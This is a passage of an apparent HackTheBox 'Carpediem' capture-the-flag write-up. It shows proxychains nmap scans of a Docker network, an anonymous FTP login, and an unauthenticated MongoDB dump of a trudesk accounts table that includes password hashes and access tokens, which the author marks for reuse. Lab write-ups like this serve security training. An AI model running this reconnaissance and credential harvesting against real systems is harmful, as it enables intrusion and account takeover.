font-style: inherit;">none</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">]</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> show databases<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb14-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+--------------------+</span></span>
<span id="cb14-6"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Database</span>           <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb14-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+--------------------+</span></span>
<span id="cb14-8"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">information_schema</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb14-9"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">mysql</span>              <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb14-10"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">performance_schema</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb14-11"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">portal</span>             <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb14-12"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">sys</span>                <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb14-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+--------------------+</span></span></code></pre></div>
<p>We find the same set of databases, so there’s really no need to continue enumerating here.</p>
</section>
<section id="step-4---enumerate-docker-network" class="level3">
<h3 class="anchored" data-anchor-id="step-4---enumerate-docker-network">Step 4 - Enumerate Docker network</h3>
<p>Continue to enumerate the surrounding docker addresses for any more hints.</p>
<p><strong>172.17.0.2:</strong></p>
<div class="sourceCode" id="cb15" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb15-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  carpediem proxychains nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-sT</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--top-port</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>200 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--open</span> 172.17.0.2</span>
<span id="cb15-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>    STATE SERVICE</span>
<span id="cb15-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">21/tcp</span>  open  ftp</span>
<span id="cb15-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">80/tcp</span>  open  http</span>
<span id="cb15-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">443/tcp</span> open  https</span></code></pre></div>
<p>Trying to access the FTP server we’re able to login with <code>anonymous:anonymous</code> but we can’t list any content:</p>
<div class="sourceCode" id="cb16" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb16-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  carpediem proxychains ftp 172.17.0.2</span>
<span id="cb16-2"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">ftp</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> dir</span>
<span id="cb16-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">500</span> Illegal PORT command.</span>
<span id="cb16-4"></span>
<span id="cb16-5"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">ftp</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> pass</span>
<span id="cb16-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Passive</span> mode: on<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">fallback</span> to active mode: on.</span>
<span id="cb16-7"></span>
<span id="cb16-8"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">ftp</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> dir</span>
<span id="cb16-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">227</span> Entering Passive Mode <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">172,17,0,2,31,233</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">.</span></span>
<span id="cb16-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[proxychains]</span> Strict chain  ...  127.0.0.1:5000  ...  172.17.0.2:8169  ...  OK</span>
<span id="cb16-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">150</span> Here comes the directory listing.</span></code></pre></div>
<p><strong>172.17.0.4:</strong></p>
<div class="sourceCode" id="cb17" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb17-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  carpediem proxychains nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-sT</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--open</span> 172.17.0.4</span>
<span id="cb17-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N/A</span></span>
<span id="cb17-3"></span>
<span id="cb17-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  carpediem proxychains nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-sT</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--top-port</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>5000 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--open</span> 172.17.0.4</span>
<span id="cb17-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>      STATE SERVICE</span>
<span id="cb17-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">27017/tcp</span> open  mongod</span></code></pre></div>
<div class="sourceCode" id="cb18" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb18-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  carpediem proxychains mongo 172.17.0.4 </span>
<span id="cb18-2"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> show <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">databases</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb18-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">admin</span>    0.000GB</span>
<span id="cb18-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">config</span>   0.000GB</span>
<span id="cb18-5"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">local</span>    0.000GB</span>
<span id="cb18-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">trudesk</span>  0.001GB</span>
<span id="cb18-7"></span>
<span id="cb18-8"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> use <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">trudesk</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb18-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">switched</span> to db trudesk</span>
<span id="cb18-10"></span>
<span id="cb18-11"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> show <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tables</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb18-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">accounts</span></span>
<span id="cb18-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">counters</span></span>
<span id="cb18-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">departments</span></span>
<span id="cb18-15"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">groups</span></span>
<span id="cb18-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">messages</span></span>
<span id="cb18-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">notifications</span></span>
<span id="cb18-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">priorities</span></span>
<span id="cb18-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">role_order</span></span>
<span id="cb18-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">roles</span></span>
<span id="cb18-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">sessions</span></span>
<span id="cb18-22"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">settings</span></span>
<span id="cb18-23"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tags</span></span>
<span id="cb18-24"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">teams</span></span>
<span id="cb18-25"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">templates</span></span>
<span id="cb18-26"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tickets</span></span>
<span id="cb18-27"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tickettypes</span></span>
<span id="cb18-28"></span>
<span id="cb18-29"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> db.accounts.find<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">()</span></span>
<span id="cb18-30"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">{</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"_id"</span> : ObjectId<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"623c8b20855cc5001a8ba13c"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"preferences"</span> : { <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"tourCompleted"</span> : false, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"autoRefreshTicketGrid"</span> : true, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"openChatWindows"</span> : [ ] }, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"hasL2Auth"</span> : false, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"deleted"</span> : false, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"username"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"admin"</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"password"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$2</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">b</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$1</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">0</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$imwoLPu0Au8LjNr08GXGy</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">.xk/Exyr9PhKYk1lC/sKAfMFd5i3HrmS"</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"fullname"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Robert Frost"</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"email"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"rfrost@carpediem.htb"</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"role"</span> : ObjectId<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"623c8b20855cc5001a8ba138"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"title"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Sr. Network Engineer"</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"accessToken"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"22e56ec0b94db029b07365d520213ef6f5d3d2d9"</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"__v"</span> : 0, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"lastOnline"</span> : ISODate<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"2022-04-07T20:30:32.198Z"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">}</span></span>
<span id="cb18-31"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">{</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"_id"</span> : ObjectId<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"6243c0be1e0d4d001b0740d4"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"preferences"</span> : { <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"tourCompleted"</span> : false, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"autoRefreshTicketGrid"</span> : true, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"openChatWindows"</span> : [ ] }, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"hasL2Auth"</span> : false, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"deleted"</span> : false, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"username"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"jhammond"</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"email"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"jhammond@carpediem.htb"</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"password"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$2</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">b</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$1</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">0</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$n4yEOTLGA0SuQ</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">.o0CbFbsex3pu2wYr924cKDaZgLKFH81Wbq7d9Pq"</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"fullname"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Jeremy Hammond"</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"title"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Sr. Systems Engineer"</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"role"</span> : ObjectId<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"623c8b20855cc5001a8ba139"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"accessToken"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"a0833d9a06187dfd00d553bd235dfe83e957fd98"</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"__v"</span> : 0, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"lastOnline"</span> : ISODate<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"2022-04-01T23:36:55.940Z"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">}</span></span>
<span id="cb18-32"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">{</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"_id"</span> : ObjectId<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"6243c28f1e0d4d001b0740d6"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"preferences"</span> : { <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"tourCompleted"</span> : false, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"autoRefreshTicketGrid"</span> : true, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"openChatWindows"</span> : [ ] }, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"hasL2Auth"</span> : false, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"deleted"</span> : false, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"username"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"jpardella"</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"email"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"jpardella@carpediem.htb"</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"password"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$2</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">b</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$1</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">0</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$nNoQGPes116eTUUl</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">/3C8keEwZAeCfHCmX1t.yA1X3944WB2F.z2GK"</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"fullname"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Joey Pardella"</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"title"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Desktop Support"</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"role"</span> : ObjectId<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"623c8b20855cc5001a8ba139"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"accessToken"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"7c0335559073138d82b64ed7b6c3efae427ece85"</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"__v"</span> : 0, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"lastOnline"</span> : ISODate<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"2022-04-07T20:33:20.918Z"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">}</span></span>
<span id="cb18-33"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">{</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"_id"</span> : ObjectId<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"6243c3471e0d4d001b0740d7"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"preferences"</span> : { <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"tourCompleted"</span> : false, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"autoRefreshTicketGrid"</span> : true, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"openChatWindows"</span> : [ ] }, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"hasL2Auth"</span> : false, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"deleted"</span> : false, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"username"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"acooke"</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"email"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"acooke@carpediem.htb"</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"password"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$2</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">b</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$1</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">0</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$qZ64GjhVYetulM</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">.dqt73zOV8IjlKYKtM/NjKPS1PB0rUcBMkKq0s."</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"fullname"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Adeanna Cooke"</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"title"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Director - Human Resources"</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"role"</span> : ObjectId<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"623c8b20855cc5001a8ba139"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"accessToken"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"9c7ace307a78322f1c09d62aae3815528c3b7547"</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"__v"</span> : 0, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"lastOnline"</span> : ISODate<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"2022-03-30T14:21:15.212Z"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">}</span></span>
<span id="cb18-34"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">{</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"_id"</span> : ObjectId<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"6243c69d1acd1559cdb4019b"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"preferences"</span> : { <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"tourCompleted"</span> : false, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"autoRefreshTicketGrid"</span> : true, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"openChatWindows"</span> : [ ] }, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"hasL2Auth"</span> : false, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"deleted"</span> : false, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"username"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"svc-portal-tickets"</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"email"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"tickets@carpediem.htb"</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"password"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$2</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">b</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$1</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">0</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$CSRmXjH</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">/psp9DdPmVjEYLOUEkgD7x8ax1S1yks4CTrbV6bfgBFXqW"</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"fullname"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Portal Tickets"</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"title"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">""</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"role"</span> : ObjectId<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"623c8b20855cc5001a8ba13a"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"accessToken"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"f8691bd2d8d613ec89337b5cd5a98554f8fffcc4"</span>, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"__v"</span> : 0, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"lastOnline"</span> : ISODate<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"2022-03-30T13:50:02.824Z"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">}</span></span></code></pre></div>
<p>The found password hashes are all bcrypt and we will not be able to crack those, instead the <code>accessToken</code> seems interesting.</p>
<p>Before moving on, lets see if we can find anything interesting from the reported tickets. Below is the heavily cropped data from table <code>tickets</code>:</p>
<div class="sourceCode" id="cb19" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb19-1"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> db.tickets.find<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">()</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">.pretty()</span></span>
<span id="cb19-2"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">{</span></span>
<span id="cb19-3">    <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"_id"</span> : ObjectId<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"624461a6f2c8c07f687ba8a6"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
